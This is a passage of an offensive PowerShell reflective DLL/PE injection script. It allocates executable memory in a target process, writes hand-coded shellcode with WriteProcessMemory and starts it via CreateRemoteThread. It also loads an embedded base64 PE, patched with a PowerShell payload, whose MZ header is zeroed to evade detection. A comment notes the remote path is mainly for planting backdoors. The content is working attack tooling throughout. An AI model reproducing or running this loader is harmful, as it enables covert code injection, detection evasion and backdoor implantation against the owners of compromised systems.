        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }   
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        
        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
            write-verbose "64 Bit Injection"
        }
        else
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
            write-verbose "32 Bit Injection"
        }
        #REPLACING THE CALLBACK BYTES WITH YOUR OWN
        ##############
        
        # patch in the code bytes
        $RawBytes = Invoke-PatchDll -DllBytes $RawBytes -FindString "Invoke-Replace" -ReplaceString $PoshCode
        $PEBytes = $RawBytes
        
        #replace the MZ Header
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    Write-Verbose "PowerShell ProcessID: $PID"
    if ($ProcId)
    {
        Write-Verbose "Remote Process: $ProcID"
    }

    $PEBytes64 = "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